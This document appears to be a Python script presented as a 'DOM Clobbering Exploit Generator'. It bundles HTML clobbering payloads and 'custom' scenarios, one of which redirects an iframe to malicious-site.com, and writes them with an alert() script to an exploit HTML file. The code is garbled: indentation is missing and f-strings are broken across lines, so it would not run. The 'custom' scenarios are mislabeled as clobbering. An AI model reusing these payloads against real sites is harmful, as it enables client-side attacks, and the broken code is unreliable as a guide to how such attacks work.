import argparse
import curses
import html

# Define DOM clobbering scenarios as functions
def clobber_scenario_1():
return """<!-- Clobbering x.y.value -->
<form id="x"><output id="y">I've been clobbered</output></form>"""

def clobber_scenario_2():
return """<!-- Clobbering x.y using ID and name attributes -->
<a id="x"><a id="x" name="y" href="Clobbered"></a></a>"""

def clobber_scenario_3():
return """<!-- Clobbering x.y.z - 3 levels deep -->
<form id="x" name="y"><input id="z"></form>
<form id="x"></form>"""

def clobber_scenario_4():
return """<!-- Clobbering a.b.c.d - more than 3 levels -->
<iframe name="a" srcdoc="
  <iframe srcdoc='<a id="c" name="d" href="cid:Clobbered">test</a><a id="c">' name="b">
"></iframe>
<style>@import '//portswigger.net';</style>"""

# Define four custom comprehensive scenarios (clobber_scenario_custom_1 to clobber_scenario_custom_4)
def clobber_scenario_custom_1():
return """
<!-- Custom Scenario 1: Manipulating Form Data -->
<form id="custom-form-1">
  <input type="text" id="input-field-1" value="Change this value">
</form>
<script>
  // Custom logic for changing form data
  var inputField1 = document.getElementById('input-field-1');
  inputField1.value = 'New Value Set by Custom Scenario 1';
</script>
"""

def clobber_scenario_custom_2():
return """
<!-- Custom Scenario 2: Embedding External Content -->
<iframe id="custom-iframe" src="https://example.com"></iframe>
<script>
  // Custom logic for embedding external content
  var iframe = document.getElementById('custom-iframe');
  iframe.src = 'https://malicious-site.com';
</script>
"""

def clobber_scenario_custom_3():
return """
<!-- Custom Scenario 3: Creating Hidden Elements -->
<div id="hidden-div" style="display:none">Hidden Content</div>
<script>
  // Custom logic for revealing hidden content
  var hiddenDiv = document.getElementById('hidden-div');
  hiddenDiv.style.display = 'block';
</script>
"""

def clobber_scenario_custom_4():
return """
<!-- Custom Scenario 4: Modifying URL Parameters -->
<a href="https://example.com?param1=value1">Visit Example.com</a>
<script>
  // Custom logic for modifying URL parameters
  var link = document.querySelector('a');
  link.href = 'https://example.com?param1=modified-value';
</script>
"""

# Create a dictionary with scenario names and corresponding functions
scenarios = {
    "1": clobber_scenario_1,
    "2": clobber_scenario_2,
    "3": clobber_scenario_3,
    "4": clobber_scenario_4,
    "custom1": clobber_scenario_custom_1,
    "custom2": clobber_scenario_custom_2,
    "custom3": clobber_scenario_custom_3,
    "custom4": clobber_scenario_custom_4,
    # Add more scenarios here
}

# HTML-escape the selected scenario to enhance security
def escape_scenario(selected_scenario):
return html.escape(selected_scenario)

# Function to display a text-based GUI
def display_gui(stdscr):
stdscr.clear()
curses.curs_set(0) # Hide the cursor
stdscr.addstr(0, 0, "DOM Clobbering Exploit Generator", curses.A_BOLD)
stdscr.addstr(2, 0, "Select a scenario:", curses.A_UNDERLINE)

# Create a list of scenario names
scenario_names = list(scenarios.keys())
current_scenario_idx = 0

while True:
for i, name in enumerate(scenario_names):
if i == current_scenario_idx:
stdscr.addstr(i + 4, 2, f" {
    i + 1
}. {
    name
}", curses.A_BOLD)
else :
stdscr.addstr(i + 4, 2, f" {
    i + 1
}. {
    name
}")

stdscr.addstr(len(scenario_names) + 6, 0, "Press 'q' to quit", curses.A_DIM)
stdscr.refresh()

key = stdscr.getch()
if key == ord('q'):
break
elif ord('1') <= key <= ord(str(len(scenario_names))):
current_scenario_idx = key - ord('1')
selected_scenario = scenarios[scenario_names[current_scenario_idx]]()
escaped_scenario = escape_scenario(selected_scenario)
exploit_code = f"""<script>alert(" {
    escaped_scenario
}");</script>"""

# Create a full HTML document with the payload and exploit code
full_html = f" {
    selected_scenario
}\n {
    exploit_code
}"

# Save the HTML to a file
with open("dom_clobbering_exploit.html", "w") as f:
f.write(full_html)

stdscr.addstr(len(scenario_names) + 8, 0, "HTML file 'dom_clobbering_exploit.html' generated successfully.", curses.A_BOLD)
stdscr.refresh()
stdscr.getch() # Wait for user input after generating the HTML

# Define CLI arguments
def main():
parser = argparse.ArgumentParser(description = "DOM Clobbering Exploit Generator")
parser.add_argument("scenario", choices = scenarios.keys(), help = "Select a DOM clobbering scenario")
parser.add_argument("--output", default = "dom_clobbering_exploit.html", help = "Output HTML file path")

args = parser.parse_args()

selected_scenario = scenarios[args.scenario]()
escaped_scenario = escape_scenario(selected_scenario)
exploit_code = f"""<script>alert(" {
    escaped_scenario
}");</script>"""

# Create a full HTML document with the payload and exploit code
full_html = f" {
    selected_scenario
}\n {
    exploit_code
}"

# Save the HTML to the specified file
with open(args.output, "w") as f:
f.write(full_html)

print(f"HTML file ' {
    args.output
}' generated successfully.")

if __name__ == "__main__":
try:
curses.wrapper(display_gui)
except KeyboardInterrupt:
pass